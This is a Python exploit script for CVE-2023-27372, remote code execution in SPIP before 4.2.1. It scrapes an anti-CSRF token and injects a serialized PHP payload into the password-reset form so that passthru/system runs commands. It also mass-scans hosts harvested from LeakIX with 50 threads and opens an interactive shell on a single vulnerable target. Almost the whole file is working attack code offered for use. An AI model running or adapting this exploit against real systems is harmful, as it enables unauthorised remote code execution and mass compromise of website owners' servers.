import os
import re
import bs4
import sys
import base64
import argparse
import requests

from rich.console import Console
from urllib.parse import urlparse
from alive_progress import alive_bar
from leakpy.scraper import LeakixScraper
from prompt_toolkit import PromptSession
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import InMemoryHistory
from concurrent.futures import ThreadPoolExecutor, as_completed


class VulnerabilityScanner:
    def __init__(self):
        self.console = Console()
        self.session = PromptSession(InMemoryHistory())
        self.options = self.parseArgs()
        self.output_file = None

        if self.options.output:
            self.output_file = open(self.options.output, 'w')

    def parseArgs(self):
        parser = argparse.ArgumentParser(description="Poc of CVE-2023-27372 SPIP < 4.2.1 - Remote Code Execution by Chocapikk (inspired from nuts7 PoC)")
        parser.add_argument("-o", "--output", default=None, help="Write output to file")
        parser.add_argument("-v", "--verbose", default=False, action="store_true", help="Verbose mode. (default: False)")
        parser.add_argument("-u", "--url", default=None, help="SPIP application base URL")
        parser.add_argument("-l", "--list", default=None, help="File with a list of SPIP application base URLs")
        parser.add_argument("--leakpy", action="store_true", help="Use LeakIX for gathering SPIP URLs.")
        parser.add_argument("--pages", type=int, default=2, help="Number of pages to fetch from LeakIX. (default: 2)")

        args = parser.parse_args()

        if args.url is None and args.list is None and not args.leakpy:
            parser.print_help()
            sys.exit(1)

        return args

    def fetch_from_leakix(self, fields="protocol, host", pages=2):
        LEAKIX_API_KEY = "" # Configure this line with your LeakIX Pro API Key to use LeakPy

        if LEAKIX_API_KEY == "":
            self.console.print("[bold red]Please configure the Leakix API key.[/bold red]")
            exit(1)
        
        scraper = LeakixScraper(api_key=LEAKIX_API_KEY, verbose=True)
        
        results = scraper.execute(
            scope="service",
            query='+"SPIP" +source:"HttpPlugin"',
            fields=fields,
            pages=pages,
        )

        url_dict = {}
        for result in results:
            protocol = result.get("protocol")
            host = result.get("host")
            url = f"{protocol}://{host}"
            url_dict[host] = url.replace('www.', '')

        return list(url_dict.values())


    def get_anticsrf(self, url):
        r = requests.get('%s/spip.php?page=spip_pass' % url, timeout=5, verify=False)
        soup = bs4.BeautifulSoup(r.text, 'html.parser')
        csrf_input = soup.find('input', {'name': 'formulaire_action_args'})
        if csrf_input:
            csrf_value = csrf_input['value']
            if self.options.verbose:
                self.console.print(f"[bold green][+] Anti-CSRF token found : {csrf_value}[/bold green]")
            return csrf_value
        else:
            if self.options.verbose:
                self.console.print("[bold red][-] Unable to find Anti-CSRF token[/bold red]")
            return -1

    def send_payload(self, url, csrf, payload):
        data = {
        "page": "spip_pass",
        "formulaire_action": "oubli",
        "formulaire_action_args": csrf,
        "oubli": payload
        }
        r = requests.post('%s/spip.php?page=spip_pass' % url, data=data, timeout=3, verify=False)
        if self.options.verbose:
            self.console.print(f"[bold yellow][+] Execute this payload : {payload}[/bold yellow]")
        #print(r.text)    
        return r.text


    def parse_output(self, text):
        pattern = re.compile(r'\[S\](.*?)\[E\]', re.DOTALL)
        matches = pattern.findall(text)
        return "\n".join(matches)

    def fix_url(self, url):
        parsed_url = urlparse(url)
        return f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"

    def check_vulnerability_wrapper(self, url):
        vulnerable = False
        for _ in range(2):
            output = self.check_vulnerability(url)
            if output:
                vulnerable = True
                if 'whoami' in output:
                    self.console.print(f"[bold yellow][!] The URL {url} is vulnerable but RCE failed (try other payloads)[/bold yellow]")
                else:    
                    self.console.print(f"[bold green][+] The URL {url} is vulnerable with 'whoami' result: {output.strip()}[/bold green]")

                self._write(f"URL: {url} ==> {output.strip()}")
                break

        if not vulnerable and self.options.verbose:
            self.console.print(f"[bold red][-] The URL {url} is not vulnerable[/bold red]")



    def _write(self, text):
        if self.output_file:
            self.output_file.write(text + "\n")

    def check_vulnerability(self, url):
        csrf = self.get_anticsrf(url)
        if csrf == -1:
            return False

        cmd = "echo [S] ; whoami ; echo [E]"
        cmd_encoded = base64.b64encode(cmd.encode()).decode() 
        command_str = "<?php passthru(base64_decode('%s'));?>" % cmd_encoded
        payload = "s:%s:\"%s\";" % (len(command_str), command_str)
        result = self.send_payload(url=url, csrf=csrf, payload=payload)
        output = self.parse_output(result)

        if output:
            return output
        else:
            return False



    def run(self):
        options = self.options
        urls = []

        requests.packages.urllib3.disable_warnings()
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass
        
        urls = []

        if options.leakpy:
            urls = self.fetch_from_leakix(pages=options.pages)

        if options.list:
            with open(options.list, 'r') as f:
                urls.extend([self.fix_url(line.strip()) for line in f])

        if urls:  
            with alive_bar(len(urls), bar='notes', spinner='wait', title='Scanning...', enrich_print=False) as bar:
                with ThreadPoolExecutor(max_workers=50) as executor:
                    futures = {executor.submit(self.check_vulnerability_wrapper, url) for url in urls}
                    for future in as_completed(futures):
                        bar()
        
        elif options.url:
            session = PromptSession(InMemoryHistory())
            if self.check_vulnerability(options.url):
                self.console.print(f"[bold green][+] The URL {options.url} is vulnerable[/bold green]")
                self.console.print(f"[bold yellow][!] Shell is ready, please type your commands UwU[/bold yellow]")
                while True:
                    try:
                        cmd = session.prompt(HTML('<ansired><b># </b></ansired>'))
                        if cmd.lower() == "exit":
                            break
                        elif cmd.lower() == "clear":
                            if os.name == 'posix':
                                os.system('clear')
                            elif os.name == 'nt':
                                os.system('cls')
                            continue
                        
                        command_str = "<?php system('echo [' . 'S' . '] ; ' . '%s' . '; echo [' . 'E' . '] ;');?>" % cmd
                        payload = "s:%s:\"%s\";" % (len(command_str), command_str)
                        csrf = self.get_anticsrf(url=options.url)
                        result = self.send_payload(url=options.url, csrf=csrf, payload=payload)
                        output = self.parse_output(result)
                        self.console.print(f"[bold green]{output}[/bold green]")
                        
                    except KeyboardInterrupt:
                        self.console.print(f"[bold yellow][+] Exiting...[/bold yellow]")
                        break    
        else:
            self.console.print(f"[bold red][-] Not vulnerable[/bold red]")    

        if self.output_file:
            self.output_file.close()

if __name__ == '__main__':
    scanner = VulnerabilityScanner()
    scanner.run()
